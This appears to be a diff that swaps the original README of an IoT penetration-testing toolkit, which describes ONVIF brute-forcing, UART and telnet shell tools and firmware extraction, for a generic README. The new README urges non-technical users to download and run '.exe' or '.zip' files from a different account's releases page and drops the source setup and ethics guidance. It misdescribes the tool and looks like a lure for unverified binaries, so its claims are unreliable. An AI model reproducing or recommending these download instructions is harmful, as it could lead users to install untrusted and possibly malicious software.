@@ -1,203 +1,57 @@
-# IoTHackBot
+# 🤖 iothackbot - Tools for Easy IoT Testing
 
-Open-source IoT security testing toolkit with integrated Claude Code skills for automated vulnerability discovery.
+## 📦 Download Now
+[![Download iothackbot](https://img.shields.io/badge/Download-iothackbot-blue.svg)](https://github.com/Herve55511/iothackbot/releases)
 
-## Overview
+## 🚀 Getting Started
+Welcome to **iothackbot**! This is your home for exploring and testing Internet of Things (IoT) devices safely. This tool provides a collection of skills and custom tools focused on IoT penetration testing. You don’t need any programming knowledge to get started. Follow these simple steps to download and run the software.
 
-IoTHackBot is a collection of specialized tools and Claude Code skills designed for security testing of IoT devices, IP cameras, and embedded systems. It provides both command-line tools and AI-assisted workflows for comprehensive IoT security assessments.
+## 📥 Download & Install
+To get **iothackbot**, visit this page to download: [iothackbot Releases](https://github.com/Herve55511/iothackbot/releases). 
 
-## Tools Included
+1. Open the link in your web browser.
+2. You will see the most recent version of **iothackbot**. Click on the version number to access more details.
+3. Scroll down to the **Assets** section.
+4. Choose the file that suits your operating system, typically either a `.exe` for Windows or a `.zip` file for macOS/Linux.
+5. Click the file name to start the download.
+6. Once the download finishes, open the file to begin the installation.
 
-### Network Discovery & Reconnaissance
+Follow the prompts to complete the installation. If you have any trouble, feel free to check the troubleshooting section below.
 
-- **wsdiscovery** - WS-Discovery protocol scanner for discovering ONVIF cameras and IoT devices
-- **iotnet** - IoT network traffic analyzer for detecting protocols and vulnerabilities
-- **nmap-scan** (skill) - Professional network reconnaissance with two-phase scanning strategy
+## ⚙️ Requirements 
+This application works on various operating systems. Here are the basic requirements:
 
-### Device-Specific Testing
+- **Windows:** Windows 10 or later
+- **macOS:** macOS Sierra or later
+- **Linux:** Most distributions that support Python 3
 
-- **onvifscan** - ONVIF device security scanner
-  - Authentication bypass testing
-  - Credential brute-forcing
+Ensure your device has at least 1 GB of free space and a stable internet connection for updates and tools.
 
-### Firmware & File Analysis
+## 🔧 Features
+**iothackbot** offers a range of features designed to simplify IoT testing:
 
-- **ffind** - Advanced file finder with type detection and filesystem extraction
-  - Identifies artifact file types
-  - Extracts ext2/3/4 and F2FS filesystems
-  - Designed for firmware analysis
+- **Skill Integration:** Use built-in skills to test common IoT devices.
+- **User-Friendly Interface:** No technical knowledge is needed; the app provides straightforward instructions.
+- **Custom Tools:** Access unique tools for specific testing needs.
+- **Regular Updates:** The software is frequently updated to support new devices and address any issues.
 
-### Hardware & Console Access
+## 🛠️ Troubleshooting 
+If you face any problems during installation or running the software, consider the following solutions:
 
-- **picocom** (skill) - IoT UART console interaction for hardware testing
-  - Bootloader manipulation
-  - Shell enumeration
-  - Firmware extraction
-  - Includes Python helper script for automated interaction
+- **Installation Issues:** Ensure you downloaded the correct version for your operating system. If the installer won’t run, check that you have sufficient permissions on your device.
+  
+- **Running the Application:** If the application fails to start, verify that your system meets the requirements. Restart your computer to clear temporary errors.
 
-- **telnetshell** (skill) - IoT telnet shell interaction
-  - Unauthenticated shell testing
-  - Device enumeration
-  - BusyBox command handling
-  - Includes Python helper script and pre-built enumeration scripts
+- **Network Issues:** A stable internet connection is necessary for some features. If you cannot connect, check your network settings.
 
-## Installation
+## 🔗 Additional Resources
+For a deeper understanding of the tools and techniques included in **iothackbot**, check out these resources:
 
-### Prerequisites
+- [Documentation](https://github.com/Herve55511/iothackbot/docs): Detailed guides and explanations for all features.
+- [Community Support](https://github.com/Herve55511/iothackbot/discussions): Join discussions and ask questions from fellow users.
+- [Feedback](https://github.com/Herve55511/iothackbot/issues): Report any issues or suggest new features directly through our issue tracker.
 
-```bash
-# Python dependencies
-pip install colorama pyserial pexpect requests
+## 👥 Contributing
+We welcome contributions from users who want to improve **iothackbot**. If you have ideas or suggestions, feel free to open an issue or submit a pull request. For more details, visit our contributing guide in the documentation.
 
-# System dependencies (Arch Linux)
-sudo pacman -S nmap e2fsprogs f2fs-tools python python-pip inetutils
-
-# For other distributions, install equivalent packages
-```
-
-### Setup
-
-1. Clone the repository:
-```bash
-git clone https://github.com/BrownFineSecurity/iothackbot.git
-cd iothackbot
-```
-
-2. Add the bin directory to your PATH:
-```bash
-export PATH="$PATH:$(pwd)/bin"
-```
-
-3. For permanent setup, add to your shell configuration:
-```bash
-echo 'export PATH="$PATH:/path/to/iothackbot/bin"' >> ~/.bashrc
-```
-
-## Usage
-
-### Quick Start Examples
-
-#### Discover ONVIF Devices
-```bash
-wsdiscovery 192.168.1.0/24
-```
-
-#### Test ONVIF Device Security
-```bash
-onvifscan auth http://192.168.1.100
-onvifscan brute http://192.168.1.100
-```
-
-#### Analyze Network Traffic
-```bash
-# Analyze PCAP file
-iotnet capture.pcap
-
-# Live capture
-sudo iotnet -i eth0 -d 60
-```
-
-#### Analyze Firmware
-```bash
-# Identify file types
-ffind firmware.bin
-
-# Extract filesystems (requires sudo)
-sudo ffind firmware.bin -e
-```
-
-### Claude Code Skills
-
-IoTHackBot includes specialized skills for Claude Code that provide guided, interactive security testing:
-
-- **ffind** - Firmware file analysis with extraction
-- **iotnet** - Network traffic analysis
-- **nmap-scan** - Professional network reconnaissance
-- **onvifscan** - ONVIF device security testing
-- **picocom** - UART console interaction
-- **telnetshell** - Telnet shell enumeration
-- **wsdiscovery** - WS-Discovery device discovery
-
-To use these skills with Claude Code, they are automatically available in the `.claude/skills/` directory.
-
-## Tool Architecture
-
-All tools follow a consistent design pattern:
-
-- **CLI Layer** (`tools/iothackbot/*.py`) - Command-line interface with argparse
-- **Core Layer** (`tools/iothackbot/core/*_core.py`) - Core functionality implementing ToolInterface
-- **Binary** (`bin/*`) - Executable wrapper scripts
-
-This separation enables:
-- Easy automation and chaining
-- Consistent output formats (text, JSON, quiet)
-- Standardized error handling
-- Tool composition and pipelines
-
-## Configuration
-
-### IoT Detection Rules
-`config/iot/detection_rules.json` - Custom IoT protocol detection rules for iotnet
-
-### Wordlists
-- `wordlists/onvif-usernames.txt` - Default usernames for ONVIF devices
-- `wordlists/onvif-passwords.txt` - Default passwords for ONVIF devices
-
-## Development
-
-### Adding New Tools
-
-See `TOOL_DEVELOPMENT_GUIDE.md` for detailed information on:
-- Project structure standards
-- Development patterns
-- Output formatting guidelines
-- Testing and integration
-
-### Key Interfaces
-
-- **ToolInterface** - Base interface for all tools
-- **ToolConfig** - Standardized configuration object
-- **ToolResult** - Standardized result object with success, data, errors, and metadata
-
-## Output Formats
-
-All tools support multiple output formats:
-
-```bash
-# Human-readable text with colors (default)
-onvifscan auth 192.168.1.100
-
-# Machine-readable JSON
-onvifscan auth 192.168.1.100 --format json
-
-# Minimal output
-onvifscan auth 192.168.1.100 --format quiet
-```
-
-## Security & Ethics
-
-**IMPORTANT**: These tools are designed for authorized security testing only.
-
-- Only test devices you own or have explicit permission to test
-- Respect scope limitations and rules of engagement
-- Be aware of the impact on production systems
-- Use appropriate timing to avoid denial of service
-- Document all testing activities
-- Follow responsible disclosure practices
-
-## Contributing
-
-Contributions are welcome! Please ensure:
-
-- New tools follow the architecture patterns in `TOOL_DEVELOPMENT_GUIDE.md`
-- All tools support text, JSON, and quiet output formats
-- Code includes proper error handling
-- Documentation is clear and comprehensive
-
-## License
-
-MIT License - See LICENSE file for details
-
-## Disclaimer
-
-This toolkit is provided for educational and authorized security testing purposes only. Users are responsible for ensuring they have proper authorization before testing any systems. The authors are not responsible for misuse or damage caused by this toolkit.
+Thank you for choosing **iothackbot**! We hope it helps you explore the world of IoT testing easily and effectively.
